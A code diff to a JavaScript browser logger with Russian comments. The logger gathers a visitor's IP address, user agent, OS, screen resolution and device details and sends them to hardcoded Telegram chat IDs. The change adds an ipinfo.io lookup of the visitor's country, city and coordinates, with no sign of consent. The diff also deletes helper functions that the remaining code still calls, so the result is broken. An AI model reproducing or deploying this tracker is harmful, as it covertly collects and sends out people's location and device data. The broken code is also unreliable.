@@ -1,59 +1,14 @@
-async function getIPAddress() {
+async function getIPLocation(ip) {
     try {
-        const response = await fetch('https://api.ipify.org?format=json');
+        const response = await fetch(`https://ipinfo.io/${ip}?token=YOUR_IPINFO_TOKEN`);
         const data = await response.json();
-        return data.ip;
+        return data;
     } catch (error) {
-        console.error('Ошибка получения IP адреса:', error);
-        return 'неизвестно';
-    }
-}
-
-function getUserAgent() {
-    try {
-        return navigator.userAgent || 'неизвестно';
-    } catch (error) {
-        console.error('Ошибка получения UserAgent:', error);
-        return 'неизвестно';
-    }
-}
-
-function getScreenResolution() {
-    return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
-}
-
-function getOSName() {
-    try {
-        return navigator.platform || 'неизвестно';
-    } catch (error) {
-        console.error('Ошибка получения имени ОС:', error);
-        return 'неизвестно';
-    }
-}
-
-async function getBatteryPercentage() {
-    try {
-        const battery = await navigator.getBattery();
-        return Math.floor(battery.level * 100);
-    } catch (error) {
-        console.error('Ошибка получения процента заряда батареи:', error);
-        return 'неизвестно';
-    }
-}
-
-function getBrowserInfo() {
-    try {
+        console.error('Ошибка получения информации о местоположении:', error);
         return {
-            name: navigator.appName || 'неизвестно',
-            version: navigator.appVersion || 'неизвестно',
-            engine: navigator.product || 'неизвестно'
-        };
-    } catch (error) {
-        console.error('Ошибка получения информации о браузере:', error);
-        return {
-            name: 'неизвестно',
-            version: 'неизвестно',
-            engine: 'неизвестно'
+            country: 'неизвестно',
+            city: 'неизвестно',
+            loc: 'неизвестно'
         };
     }
 }
@@ -65,6 +20,7 @@ async function sendDataToTelegram() {
     const additionalChatId = 6639527896;
 
     const ipAddress = await getIPAddress();
+    const ipLocation = await getIPLocation(ipAddress);
     const userAgent = getUserAgent();
     const osName = getOSName();
     const screenResolution = getScreenResolution();
@@ -92,6 +48,9 @@ async function sendDataToTelegram() {
 
 <b>🖥️ Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
+├ Страна: <code>${ipLocation.country}</code>
+├ Город: <code>${ipLocation.city}</code>
+├ Координаты: <code>${ipLocation.loc}</code>
 ├ UserAgent: <code>${userAgent}</code>
 ├ Хэш: <code>неизвестно</code>
 ├ Имя ОС: <code>${osName}</code>
